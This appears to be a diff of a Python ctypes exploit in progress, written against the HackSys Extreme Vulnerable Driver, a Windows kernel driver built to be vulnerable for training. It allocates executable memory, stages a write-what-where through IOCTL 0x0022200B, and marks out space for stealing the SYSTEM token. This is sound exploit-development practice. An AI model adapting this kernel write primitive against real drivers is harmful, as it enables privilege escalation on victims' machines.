@@ -1,7 +1,6 @@
-import ctypes, struct, sys, os, win32con, time, platform
+import ctypes, struct, sys, os, time, platform
 from ctypes import *
 from ctypes.wintypes import *
-from win32com.shell import shell
 
 #easy definitions to save characters
 ntdll = windll.ntdll
@@ -9,8 +8,21 @@ kernel32 = windll.kernel32
 gdi32 = windll.gdi32
 user32 = windll.user32 
 
+GENERIC_READ				= 0x80000000
+GENERIC_WRITE				= 0x40000000
+OPEN_EXISTING				= 0x03
+FORMAT_MESSAGE_FROM_SYSTEM	= 0x00001000
+MEM_COMMIT					= 0x00001000
+MEM_RESERVE					= 0x00002000
+PAGE_EXECUTE_READWRITE		= 0x00000040
+PAGE_READWRITE				= 0x00000004
+NULL						= 0x00
+STATUS_SUCCESS				= 0x00
+
 #constants - I'm not even sure what these do
 ntdll.NtAllocateVirtualMemory.argtypes = [c_ulonglong, POINTER(c_ulonglong), c_ulonglong, POINTER(c_ulonglong), c_ulonglong, c_ulonglong]
+kernel32.WriteProcessMemory.argtypes = [c_ulonglong, c_ulonglong, c_char_p, c_ulonglong, POINTER(c_ulonglong)]
+kernel32.DeviceIoControl.argtypes = [c_void_p, c_ulong, c_void_p, c_ulong, c_void_p, c_ulong, POINTER(c_ulong),c_void_p]
 STATUS_SUCCESS = 0
 written = c_size_t()
 
@@ -20,57 +32,59 @@ baseadd = c_ulonglong(0x000000001a000000)
 # Some size
 addsize = c_ulonglong(0x3000) 
 # The win32con may be fucked up, but I saw this in another exploit's source code using this same library I think it's ok.
-dwStatus = ntdll.NtAllocateVirtualMemory(0xFFFFFFFFFFFFFFFF, byref(baseadd), 0x0, byref(addsize), (win32con.MEM_COMMIT | win32con.MEM_RESERVE), win32con.PAGE_EXECUTE_READWRITE)
+dwStatus = ntdll.NtAllocateVirtualMemory(0xFFFFFFFFFFFFFFFF, byref(baseadd), 0x0, byref(addsize), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE)
 # If not zero (True), something didn't work.
 if dwStatus != STATUS_SUCCESS:
-	print("Something went wrong while allocating memory","e")
-	sys.exit()
+    print("Something went wrong while allocating memory","e")
+    sys.exit()
 
-def writeQWORD(Driver=None, What=0x4141414141414141, Where=0x4242424242424242):
-	what_addr = 0x000000001a001000 # Arbitrary offset inside baseadd
-  	# Write the what value to what_addr
-	data = struct.pack("<Q", what)
-	dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFF00000000, what_addr, data, len(data), byref(written))
-	if dwStatus == 0:
-		print("Something went wrong while writing to memory","e")
-		sys.exit()
-  
-  # Pack the address of the what value and the where address
-	data = struct.pack("<Q", what_addr) + struct.pack("<Q", where)
-	dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFF00000000, 0x000000001a000000, data, len(data), byref(written))
-	if dwStatus == 0:
-		print("Something went wrong while writing to memory in the packing section","e")
-		sys.exit()
+def writeQWORD(driver, what=0x4141414141414141, where=0x4242424242424242):
+    what_addr = 0x000000001a001000 # Arbitrary offset inside baseadd
+    # Write the what value to what_addr
+    data = struct.pack("<Q", what)
+    dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF, what_addr, data, len(data), byref(written))
+    
+    if dwStatus == 0:
+        print("Something went wrong while writing to memory","e")
+        sys.exit()
 
-	#IOCTL
-	IoControlCode = 0x0022200B
-	#Where
-	InputBuffer = c_void_p(0x000000001a000000)
-	# I THINK this should work? 
-	InputBufferLength = len(InputBuffer)
-	# If our buffer length is zero can't we set OutputBuffer to None?
-	OutputBuffer = c_void_p(0x00000001a002000)
-	# The OutputBufferLength is already set to zero. I think we can get rid of this?
-	OutputBufferLength = 0x0
-	dwBytesReturned = c_ulong()
-	lpBytesReturned = byref(dwBytesReturned)
+    # Pack the address of the what value and the where address
+    data = struct.pack("<Q", what_addr) + struct.pack("<Q", where)
+    dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF, 0x000000001a000000, data, len(data), byref(written))
+    if dwStatus == 0:
+        print("Something went wrong while writing to memory in the packing section","e")
+        sys.exit()
+    
 
-	triggerIOCTL = kernel32.DeviceIoControl(driver, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, lpBytesReturned, NULL)
-	return triggerIOCTL
+    #IOCTL
+    IoControlCode = 0x0022200B
+    #Where
+    InputBuffer = c_void_p(0x000000001a000000)
+    # I THINK this should work? 
+    InputBufferLength = 0x10 # can't take length of a void pointer len(InputBuffer) 
+    # If our buffer length is zero can't we set OutputBuffer to None?
+    OutputBuffer = c_void_p(0x0)
+    # The OutputBufferLength is already set to zero. I think we can get rid of this?
+    OutputBufferLength = 0x0
+    dwBytesReturned = c_ulong()
+    lpBytesReturned = byref(dwBytesReturned)
+
+    print "Value before DeviceIoControl: %08x" % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
+    triggerIOCTL = kernel32.DeviceIoControl(driver, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, lpBytesReturned, NULL)
+    print "Value after: %08x" % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
+    return triggerIOCTL
 
 # This block is reserved for moving the token from the SYSTEM process to the CURRENT process.
 
-
-
 # Exploit the driver
 def executeOverwrite():
-	driver_handle = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000,0, None, 0x3, 0, None)
-	if not driver_handle or driver_handle == -1:
-		print "[!] Driver handle not found :(\n"
-		sys.exit()
-	else:
-		print "[X] Got handle to the driver.\n"
-		writeQWORD()
+    driver_handle = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", (GENERIC_READ | GENERIC_WRITE),0, None, 0x3, 0, None)
+    if not driver_handle or driver_handle == -1:
+        print "[!] Driver handle not found :(\n"
+        sys.exit()
+    else:
+        print "[X] Got handle to the driver.\n"
+        writeQWORD(driver_handle, 0x4142434445464748, 0x000000001a002000)
 
-		
-executeOverwrite()	
+        
+executeOverwrite()
